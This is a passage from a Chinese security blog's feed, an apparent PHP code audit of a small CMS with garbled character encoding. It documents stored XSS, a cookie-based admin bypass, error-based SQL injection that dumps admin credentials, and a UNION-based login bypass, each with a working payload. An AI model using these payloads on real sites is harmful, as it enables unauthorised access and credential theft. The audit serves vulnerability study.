php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$name=$_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$mail=$_POST[<span class="string">&#x27;mail&#x27;</span>];</span><br><span class="line">$url=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$content=$_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">$cid=$_POST[<span class="string">&#x27;cid&#x27;</span>];</span><br><span class="line">$ip=$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">$tz=$_POST[<span class="string">&#x27;tz&#x27;</span>];</span><br><span class="line">.....</span><br><span class="line">$content= addslashes(strip_tags($content));<span class="comment">//è¿‡æ»¤HTML</span></span><br><span class="line">....</span><br><span class="line">$query = <span class="string">&quot;INSERT INTO interaction (type,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date</span></span><br><span class="line"><span class="string">) VALUES (&#x27;<span class="subst">$type</span>&#x27;,&#x27;<span class="subst">$xs</span>&#x27;,&#x27;<span class="subst">$cid</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$mail</span>&#x27;,&#x27;<span class="subst">$url</span>&#x27;,&#x27;<span class="subst">$touxiang</span>&#x27;,&#x27;<span class="subst">$shebei</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;,&#x27;<span class="subst">$content</span>&#x27;,&#x27;<span class="subst">$tz</span>&#x27;,now()</span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br></pre></td></tr></table></figure><p>åœ¨è¯„è®ºåŒºå¯ä»¥æäº¤æ˜µç§°ã€é‚®ç®±ã€ç½‘å€ã€å†…å®¹ã€‚ä½†æ˜¯æ˜¾ç¤ºè¯„è®ºå’Œç•™è¨€çš„åœ°æ–¹åªæ˜¾ç¤ºæ˜µç§°ã€‚æ‰€ä»¥åªæœ‰æ˜µç§°å¤„æ‰å­˜åœ¨å­˜å‚¨å‹XSS</p><p>payload: <code>Taoo&lt;img src=1 onerror=alert(/Tao/);&gt;</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301224752498.png" alt="image-20210301224752498"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301224759193.png" alt="image-20210301224759193"></p><p>å‰å°æ–‡ç« å¤„</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301224817361.png" alt="image-20210301224817361"></p><p>æŸ¥çœ‹åå°</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301224845097.png" alt="image-20210301224845097"></p><h3 id="å‚ç›´è¶Šæƒï¼ˆé€»è¾‘æ¼æ´ï¼‰"><a href="#å‚ç›´è¶Šæƒï¼ˆé€»è¾‘æ¼æ´ï¼‰" class="headerlink" title="å‚ç›´è¶Šæƒï¼ˆé€»è¾‘æ¼æ´ï¼‰"></a>å‚ç›´è¶Šæƒï¼ˆé€»è¾‘æ¼æ´ï¼‰</h3><p>æ¼æ´å‘ç°åœ¨<code>inc/checklogin.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user=$_COOKIE[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($user==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">header(<span class="string">&quot;Location: ?r=login&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯¥ä»£ç å­˜åœ¨è¶Šæƒè®¿é—®ï¼Œè¿™é‡Œç›´æ¥ä»<code>COOKIE</code>å¤„èµ‹å€¼ç»™<code>$user</code>ã€‚å¦‚æœ<code>$user</code>ä¸ä¸ºç©ºå°±å¯ä»¥ç›´æ¥è®¿é—®</p><p>æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥åˆ†æä¸€ä¸‹åå°ç™»é™†çš„æ‰§è¡Œæµç¨‹ã€‚</p><p>é¦–å…ˆè®¿é—®<code>admin</code>ç›®å½•ï¼Œé»˜è®¤è·³è½¬ä¼ å‚<code>?r=login</code>,ä¹Ÿå°±æ˜¯ä¸‹é¢çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œæ–‡ä»¶åŒ…å«<code>admin/files/login.php</code>æ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302144648616.png" alt="image-20210302144648616"></p><p>ç„¶ååŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302144801960.png" alt="image-20210302144801960"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302144833207.png" alt="image-20210302144833207"></p><p>è¿™åé¢æ²¡æœ‰ä»€ä¹ˆï¼ˆè¿™æ˜¯æ­£å¸¸è®¿é—®ï¼Œè¾“å…¥è´¦å·å¯†ç çš„æµç¨‹ï¼‰ã€‚</p><p>ä½†æ˜¯æ³¨æ„æˆ‘ä»¬è¦åˆ©ç”¨æ­¤æ¼æ´çš„è¯ï¼Œéœ€è¦ä¿®æ”¹å®Œcookieåè®¿é—®<code>admin/?r=index</code>,<code>admin/index.php</code>ä¼šåŒ…å«<code>files</code>æ–‡ä»¶å¤¹ä¸‹<code>index.php</code>æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå®é™…è®¿é—®çš„æ–‡ä»¶å°±æ˜¯<code>admin/files/index.php</code>,æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302145815891.png" alt="image-20210302145815891"></p><p>ç›´æ¥å°±åŒ…å«<code>inc/checklogin.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user=$_COOKIE[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($user==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">header(<span class="string">&quot;Location: ?r=login&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$_COOKIE[&#39;user&#39;]</code>ä¸ä¸ºç©ºå°±ä¸è·³è½¬åˆ°<code>?r=login</code>,ç›´æ¥è¿›å…¥åå°</p><p>è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œæˆ‘ä»¬ä¿®æ”¹å®Œcookie,ä½¿å¾—<code>$_COOKIE[&#39;user&#39;]</code>ä¸ä¸ºç©ºã€‚ä¸ä¸€å®šéè¦è®¿é—®<code>admin/?r=index</code>,è®¿é—®æœ‰è½½å…¥<code>inc/checklogin.php</code>æ–‡ä»¶éƒ½å¯ä»¥</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302150259938.png" alt="image-20210302150259938"></p><p>æ¼æ´åˆ©ç”¨ï¼š</p><p>è®°ä½ç®¡ç†å¤„è·¯åŠ²ï¼š<code>http://www.bearsea.com/admin/?r=index</code></p><p>é€€å‡ºç®¡ç†å‘˜ï¼Œæ¥åˆ°ç™»å½•å¤„ã€‚æ·»åŠ cookieå€¼</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301225541514.png" alt="image-20210301225541514"></p><p>å†æ¬¡è®¿é—®åå°ã€‚æ²¡ç™»å½•ä¹Ÿç›´æ¥è¿›å…¥äº†åå°é¡µé¢ğŸ˜‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301225613218.png" alt="image-20210301225613218"></p><h3 id="åå°SQLæ³¨å…¥"><a href="#åå°SQLæ³¨å…¥" class="headerlink" title="åå°SQLæ³¨å…¥"></a>åå°SQLæ³¨å…¥</h3><p>æ¼æ´äº§ç”Ÿæ–‡ä»¶<code>admin/files/login.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$login=$_POST[<span class="string">&#x27;login&#x27;</span>];</span><br><span class="line">$user=$_POST[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$checkbox=$_POST[<span class="string">&#x27;checkbox&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($login&lt;&gt;<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>$query</code>å­˜åœ¨SQLæ³¨å…¥ï¼Œè¿™æ˜¯<code>$user</code>æœªç»è¿‡ä»»ä½•å¤„ç†ï¼Œç›´æ¥ä»£å…¥è¯­å¥ä¸­æ‰§è¡Œå¯¼è‡´çš„</p><p>åˆ©ç”¨æ–¹å¼ï¼š</p><p>user: <code>1&#39; or updatexml(1,concat(0x7e,(select concat(user,0x3a,password) from manage)),1)#</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302143335674.png" alt="image-20210302143335674"></p><p>ç™»å½•ï¼Œè¿”å›ç®¡ç†å‘˜è´¦å·å’ŒåŠ å¯†çš„å¯†ç </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302143403205.png" alt="image-20210302143403205"></p><h3 id="åå°ä¸‡èƒ½å¯†ç ç™»å½•"><a href="#åå°ä¸‡èƒ½å¯†ç ç™»å½•" class="headerlink" title="åå°ä¸‡èƒ½å¯†ç ç™»å½•"></a>åå°ä¸‡èƒ½å¯†ç ç™»å½•</h3><p>æ¼æ´äº§ç”Ÿæ–‡ä»¶<code>admin/files/login.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$login=$_POST[<span class="string">&#x27;login&#x27;</span>];</span><br><span class="line">$user=$_POST[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$checkbox=$_POST[<span class="string">&#x27;checkbox&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($login&lt;&gt;<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line">$result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.mysql_error());</span><br><span class="line">$users = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span> (!mysql_num_rows($result)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$passwords=$users[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($password)&lt;&gt;$passwords)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$login</code> æœªç»è¿‡ä»»ä½•å¤„ç†æ‹¼æ¥sqlè¯­å¥ï¼Œä¸”åªè¿›è¡Œäº†å¯†ç md5å¯¹æ¯”ã€‚å¯ç»•è¿‡</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301230717310.png" alt="image-20210301230717310"></p><p>payload: </p><p>userï¼š<code>-1&#39; union select 1,2,3,&#39;ace1785ac351e22a3d18e594d77a67dd&#39;,5,6,7,8 #</code></p><p>password: <code>Tao</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301230648438.png" alt="image-20210301230648438"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301230658398.png" alt="image-20210301230658398"></p><h3 id="åå°å¤šå¤„æ¼æ´"><a href="#åå°å¤šå¤„æ¼æ´" class="headerlink" title="åå°å¤šå¤„æ¼æ´"></a>åå°å¤šå¤„æ¼æ´</h3><p>åå°æš‚æ—¶ä¸å®¡äº†ï¼Œä¸‹æ¬¡ä¸€å®šğŸ‘Œ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ¼æ´ç¯å¢ƒ-amp-æ­å»º&quot;&gt;&lt;a href=&quot;#æ¼æ´ç¯å¢ƒ-amp-æ­å»º&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´ç¯å¢ƒ&amp;amp;æ­å»º&quot;&gt;&lt;/a&gt;æ¼æ´ç¯å¢ƒ&amp;amp;æ­å»º&lt;/h2&gt;&lt;p&gt;è®¿é—®&lt;code&gt;install&lt;/code&gt;ç›®å½•ï¼Œå¡«å†™ç›¸å…³é…ç½®ã€‚&lt;/</summary>
      
    
    
    
    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHPä»£ç å®¡è®¡" scheme="https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>é¢‡æœ‰æ„Ÿè§¦çš„2020</title>
    <link href="https://taonn.github.io/2020/12/31/%E9%A2%87%E6%9C%89%E6%84%9F%E8%A7%A6%E7%9A%842020/"/>
    <id>https://taonn.github.io/2020/12/31/%E9%A2%87%E6%9C%89%E6%84%9F%E8%A7%A6%E7%9A%842020/</id>
    <published>2020-12-31T14:52:00.000Z</published>
    <updated>2021-02-02T13:01:04.243Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a65da7077369b239139e1205727218fb89abc5f8adb07965bda2760840786a6d">f7b1e34634be17e4a4592cff2138fd5b0ec46f04e1a74397ec69690b88425adf8664a4698d57ff79076531e450e72d1c5ec1df63d074c0ddac7ebaac361b7cd9178f9d14672fc5d3b68f41e5bb363ac8d03e1e22c7d9d57b7bb7cc822890f2edeb420780f32949c32274ed5b728216c5350a34f06dddbd60bbdb8cb83c3c373ee754cec78e1197bcd310988f419ff1d7d12b47a363939eb3628dca8cd14f355308421e0312c39bcbb215222bbaf3f6b87328c5e3634e84986da3ee73f9c4482e962e52f5c94e477ef6912720f83f4b262d199587cda78e480844989d3dc314745189f8e610b6c96f410e965d00f798971d959e53813e4ec4391d9384d48443acea687783f1ee1dd43fdb2c9fcc7209715d4508058683b1bc2b73fcbd71e75d7c09ffe64343fa888f2b5cafeb592050122a970e49d87cea1f33a81e85fcf76d90cc42b8b230001eb29ea20116cc7a4b784609ca3e096307008e74ed746e3fd538f9f850812823c8a5b1854b328bc4c69129f741e6fb8c1f03662d312311357f04ec9e02e72eb3d4c6c895353bce6c1dd562cefc8d5377b4c5e627ecef9f0cf872385730bd4ad42926a7e1ee11e66400affe6380aaabdf5a93ca444d28444d6f1b32619c8758222688a64689dee170beeb7bc67c9ce8a8d92ce91c0800ce9a986cdaac94b86a4ae97d86cfbd85daaea5ae0e73477d5913280b76c69664984ec025d2db69d8d4d16a91b1076dbf2506719c962c01c005e61bb7db0d764ae207b82f51620c1af23d85b6bd9f5047b6ee8600e92b11b6dfbfe523f953c42ccc6bc75844caf8824f99ea53f107edb1866862e1b743f20006712685ed1e2e9fc1b58d8a9f808e189d1042c36cc50c63191074d7565f930ab07861b032117758742e50f20037b576c1fb5079f16edc05bfc9ef25196b0ae9a967cacf47f4e8bd008c07799d3d9d18789760630d1b275d6c137bc93eeefd2a5c5576bba7bf80d5a246d305a1c33b931b2f1745359244d1b4d7687b58cc7dd380bf4d0a0069f7ea9000a9c34d991af6380e1814b461d893eade3e91d13deef0284806ada188beb621dd58d58af013dcaf41f9f8d357dab194233559bcebdc731e8f4ce1e138afae8c584ff7c1614cdecbdb7c8b7a2368908867e34201f10ee6f98928299de275688f6d8c34cbddf11ffb704a1d1b4407c6dafb11627079f587cdc4ea67661372957bbb76edcd8bebfd90f556eb8e53eedd4af1734a52e3e6f318f26d39093827e195646e85e92a6f11010773f3018e8a0d8349058f25e298d49107286d9d51c3ebe9ac55f6fd0179f5cb13ea28c5fa6a39e546413bf30a7e306fdb304b20ae6a63a8d6a357f2fcb175da127e9067b3f156e94db3cc6f10faa6e93717269ff0716764ce8431b98d0d88c62638e4a9ac9c35b67821d2ada8667d4b3787f025ee065353d9ea59709fce63007ce8aab53c9034b90be5e2e32223c8cf010ece14016092cca9173554fa55f6dc8ebea14c259fb81e790410fe4caf5e01499202d2f35490dfb3c5a250490dbe5318c3989ddba4f707f4daa0a0f4ded28b6a869b3cf2167f742e246be91bdb4cb755b0cd470b9685a9ccc26dc914383a3df1f990b404621c5c19f6f0ac3930e5a86de3a9989556642b90da30785c74dfef47cc2f4067264aa6753c610024ff6530849525baf6501c3c64fb79f9bdc0d1f79be57e0c38aa702eb0d63e731a45df3b48ea922e3d9e298deced606800fe0600586c23cae69b8353ee10faf4d0dd61b5da99fcd51e71a5258a1a4104e0018a1b8e073ed68000ddd6fc718a3e4c3531790eac4847c16268da0fb9566a7dd2069f1f041f2f20bac36a67665c87512a86b4f9101436f91897ff496c6a07ed283b58422ae422fa8ff9990b278affaf8639c7db2f65eef1d619fd1beaf12fce292ee4c41071aae9c75de573c2c5bf6dbf270ac1dc9ea3f172e39dbceb51e4662459fe3defa966f7641bfabde50079164e20bd67fdf41587c0fd462bea70c878624900e2bc5db0ee6ae2fb8a8218f5d3e5fb0483c7f06392b2dda549f0f23b429f4ec5fc54e8c0449ad45165463f4d671763df0cc395711a4cf19db19a323c476d808ad917504e5172ce1c2da8974ad1ddbcea7a95fe3f6989dd57f5f67a2f5027dbf94744ad42600b2bed25438660359a94791d339053835252f7105ccfeb9eb112c15c24f4e7b40c666a58ebd8f892d5e32d4719baa9794b22f3f763f5a764df82539dc92698f39ad589c81ac964d79c0a78faff817410c164bc024fba87e2b3f4082dc587eb264f9f7dc2aa4e63a5074af26c464f3354180d802d4ff8c9df6a4e1f995ac84a09119773c26e3fc12cb7c8580bf6dab254e399c19a55100b8018bd071964e214e806c3f60a7ef8d370e22ad4ad6700eb622d60b3cbe91d85b5e3472081b3a7dec7f83ff26746b8e16fbd456f819c2e2fee4f259f59a004f95efc9920631a6b2037a710766446d023e11685abe44281f64acb803be97d5f7c67df392051bcfba0267159661a0ff8f5fa693e97c3af6b2d7e51771242fc03c74f297e212a123472bd5f0a396b64cbde208eebca48887055a06430f39869d9b3aae71f2c3e05c3a375d2b33b71aac88fc7ffe6475f1d400dae765d6b3dec54470bd0766b37b54e2d19ab858522554724193667eb4121ed1742a082110368485b6ce15f723699053c64c9a90d193e1c1d2980fd7ff54b4658e98963221b0bb625d64e401e1c0bb102cd3a3b8d8755125ed69884d53d87d7c7fac169c7da22ff2968ff69839bced7ac7682be9e0940416122292e364452794481a0bd88a25191673047502abd4cc9197590cfa8a58920a2fc4482209c8e1abefd1a2562eefa0db8db4c0c13a6717ca13f49db9330ba5f96011ad5cf5fca08dd3ba3169600a226a9d78635c7b128e86543d683bcb61e3c3b2cb14b4e0f710f17c3796b7e16fa7aa0df0af57234b80fb19dbc58ea49deba6654e3cafe0b6f3060e22dc29e8772aa25a3fe20d0a43739f3950cb80315c342c61310e269c58a997cf469cae19fbc7e152824883fbc85101f98c482f179b6cc9e131bcfef3dc0aa91865a7e6c1dd3b98a978af38d788fbc0fbdffeb55ed1468226ff1059956097de839e7bcf22f6f9f80c0de92bf8bf83910b0ecd2ed709a25ae35e29751eb0e3419d4675589a5a89a11fb12146051309d673d8bbddab8e5b496e748ad95e87893800db0768cbe878b0dbe45b3f22647597984f01c0223b0fabdf8ac0804eb3d0c8e2c39812ff638553e9f74c7038a47c018fb9a6025d6791b4ceb00046a27ec08c61cdaaa60265de698be00ecda88d210a69b0d5479f9d093ed3bc11ab85c4e9ac6a8ab2b0bbbb1b2892bf06f92e2e9fddbf01051ab70ae61406e30cab627621eb3dac22e69bffc389074f3857210496911007c55beb521e1f07881ed8c4e4acbb558aa8273cdec59a82f70bc5efa4b6d37c8992600f75285415bab83c8ccc2aee15b66a2cc976ca05a0fc41ab50f754e2d29976bee5af22df76cda0b6660ec84283586bb570bff8b9c0bff65a39a3b87022ff4bc1fa1159d7e8ee118c945a3f9803a1e7709bd2e6007b7b5f0923690ac145cc6940882d438b9dcd8a869ecf8857cf7cf7746b746399def1a6114d6d1cdde86e08d7f241ff0ec3014744368ebc827887f76ad1dbb27bba322d0405b239025ee8f874ff0a58f6150b725dc3ccca06ca465b9643987cfea37880aa8fd61776f00774cdac3f5f7c81ed25e03fe559961d5054012338417dcc0811501f01abf5dca0288126d450d8acefd0844fdd59ceb27edddb6da538ed05806c06b636ab65ad1eba8ae3714446ec74e3f9e63012dd00433a93f7fd9438639a60bc31b0b0a8393596b55455e600d3c4103b66fbb3c4f6b3c5829fcaf5c86fccdcc64d1c5f254899f125888d656403f14c26ec26a113d84b8b32c99df7b4550d0aba6fe9abdae4e0ac5add2a07cede1d0ab8f69e5e45bd201a2dd6e3bc1f0245f1c3383204785d6eabe0aea1efb37fd9fa98df9f1fe7fed1bc29d5409c0d8643d7ee3274028c62176a53b11879eea359d0183d9694c2c03bad8dc364853d3cb18d921ef280a0245fb69f129124404155b95f476d31b756046c91bd9f5f066e3b6c56e534979a2c8b0beed888c88d6b9fb75176f9f16a226a8443033b38519f684fcd81c5d9fa5bb0029f7ec99e7052c9f596f4f39279ecdbfd183c37f1223a2e390652e7d3920d623c91f5114ce91c5abd8203003861afd5545398376a0aafda51991f56579870cd180639190c84a486ee51780847b4d721e6217fc9da918b8a537f154d40662f40dfd884a0900769fa2093b44b0f377f274cac906226e01ed7bf6f94140540f8b4bb995234fd399d064ddbd4e4c7218b57c81b3215e72274d74bbb3ed6aa829697c0dd6e037d9c44d9cf38a763a15e2ba291007792685cb0c555393356c9ff2481a43b014d799f849bdb8995b4f2f07e8dc3034b7f48f2150567156768fb0d2db040a2641ae2494a56c50a87badbead27d298d171653fd851c37aa37094a641b4b9dc71f158942fdd5e8a83ce846a2b5fbf13ad9f82ee30f682b2d411171762eb7874fd395a3d82cbe89513d1c048f329c5649811ac08c6aa03fca163f6f4eb8893a4d03197736ec2490f586c8ef20f2a2d3fd7c2b8748c158db7ecec110990af92694dae159acb8ee79d6af583cafb5621f960ba976bf0c9a237a745b2eceb373f1141442c1ba570d9849de5d17579de4f1c52bcfda8acb559597f32da95a3c3512a306c284ac5b029b4370e2b0ccdd7bd47cd07777271ca4aa51b6e29957199984d0ec42a5a0fb3736080d2006480021bafd32acdc456521f9b416a3b5b75d52e0d86495d36bdfb121654c89ca9ac58b420148604ee00cc82cb65aab118ad69b00e78a891c1ada1294fad692b23dcdefe3564379ac75a6626f4c19d89a0737e1ef9f06d307c56b7b1eb4280ee14ec0ac85a5c0f294e657c3a8ed7986fa092596727d41dac97e4cd1555f97cf7a61d5ac4bce13f3fb0bf59c223d47a6ec6f2b5e84c916f6eef2ca37058b43d1177e202d355583883c62a998e5b9772336d435babd32653b8c0c5cb2e03eb362743393749fa6426bfbba1fb2a301569def813fe7a968cb826d7e5ed82a1bbd192196a092c0c3ff888a0d9d0321d1a2c46e28f6609d4aa6536266d5ed8198933fa650d01d0c6718be08f285af70372a1671f4fa9e17a3bd5b24b0a00a6fc83967af9398e8de21bc777e21c7b3609656acd087f440620313f593534a1333680df1b7ac368fda40de65f286506aacfea6f0e0146afc4b45ae21cb433fdfec75436ee70a50a3ebcd66a826b13332f66b4bb5962bb6dc5b61d7f196e2fe99d371e7a8a7a86020937eb046728ca2b12cd14ff9af9ae750897fdaad9badf6afc21f2409b7213bdbf1926debf72cd6a42f803e33f1e8ab3c73444efc9e4bf62aaa90928967aa322ff663181da2db50973195f35ed0d75fb55ba4d231db24eee4147de9cc524711e22482ffeee6dfa9248dcb42ef40255a465f6987923619e14fa844131155cd340f97cefb1ba2b46a4ea174fbb887440829ccc12a58bac8f6c0a16a2f4fa2a1778ae5744002890241bf3b607c5b1919cc2e395ce0baca952a94a2641dd36bc40fee82da60fb897d95eab1b7a2fc3855f7d328db64d8f88313c1179f16b258b32ca9a43be65ff9798ad665a36185cec5af51b814609d5e1e4284436c85110914b723500348285d01d342fc9130fa5e5f740b5f85e889e666ed18a74be26524ad4cbc2229705c85957dfa365ba6a990ce6525a5b084fd8b65d9441ee1888eef4f0622c3727da31ffd3f09efb9a71f2e08d26eeb6600f52bee9867593c480234d3816394684259dc93fd476c646a7706396b2d81eb6b39733d77bc50a94df414bb74f88f5f4ea4aed5c283b8168cab7626c09e800c7461cf6404a59eaeef9f90e3ba78dbe54e120f7e521c5fb0b51a682e98b843f361ab076255356fe74cfcee1390922e0868f0162bb5cc3a0025bfe4b33a6a0b44561ebd9a10927f1d18054eb5524e7b3a3409d5d5d06a80385b161c6bc9cb2529a681df578066c3eaf83bb3791a312eb64ed2329ab83eaada76c9727501250ab1307cbf8febb3bc5322807e2183445ba51510e97647a22dbca53aa31cd90c6caf3d6e741b172b6a30825f9056305225de50fd0a8f25e42a6ff5885364a3c817c86cd22631360c61076a84516710f8d0325f823b85d319890a18e6a6d53705dad69d3057dfac6ef5242dc20851efad1b57902c6a0e626837a980ecec55017eb7fbc352c2e10852f842c271513242b39ea2df94175505233da45c334ee0fd52cb4fe6eacdbe3b800a72f22a429aec4e91a0f1605a41b8b2618c89efb2a4dfda2709e5c38b764e538c1bfcfaf915552768b8a09606d497627e6d8645a2bec6c23022bfe16b7385383bb4cf3581f71f1b7c23093f58d9c7e78e10f73012a6c0ce2db42fe7ee6a855bda79d8e996e83686506a55da9e79974060d779d6507a6713b07153185172fb0851601c1f788d91db3dcb19e385da594db77c7b16e2bceaab15f7e6eecb5f0cc4a7d248a957f94800fd0395de8b17d94fa77cfc4b0e1aa0d20f761304282236e864d02e5470aa85d6a35c140d7b54623f17d57e0061ff63c061a1eb316c18006740083e67b282c3f6bce5ab0e469236602fdfee3b22db885341fdb166e758b0e57e00e99f9420fccaa0a691f79d9b51e87d9e415708c02f05ef4ff6d0af9a73beb33e62662ba0f9422870fe6870ed718aab3276b25a729817599e6f330e9727aefafe310435a5b0854f76310355a4de10b15dbe0e8d7e5592204c61f2e301b017ec2b432cf50fe5f34f491b6fabe7a29a796e97f95d2c3fc090768953a856ed18808402488fb4f2c9124486b062af95ea527869dd1af754d48d439d4a15bee4880c9e1083bb0cb29aceb8c9d08e679070509d080066790715e4e2436574934f57a2f0161ac5352a3c78f96113a1bd04db7f29db230dbd6c0aff39838b5e9985e194415a03495d98f9f8e47ecd51f65e40410e359fff91ff6fd5fa8af0ab707889fbd557859788b990016f6affbf88b27cf542b6d68b6c476058f0d13795c82e7138fcfa19b9e25ac58684d2c2b0a081bec777ce9788ad4b7398f199e8f2091cbb0e2c3d0108b088b3aa4bb1b7b9b5718cd460108d0802f78b6927ee78adf9bac08223f0a24f8685c90f0fa9a3417026c00e03ccbe1b047b48939fcc8ac9c13acce8a41a9b36dcc68d2178b82757c62116dffac9b25b727c981ed001c4eb2c072ca468b91fc2eeb6410c19d35971ec73ef52db6a2816f67e410f777b66f3a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-up">      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-up">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
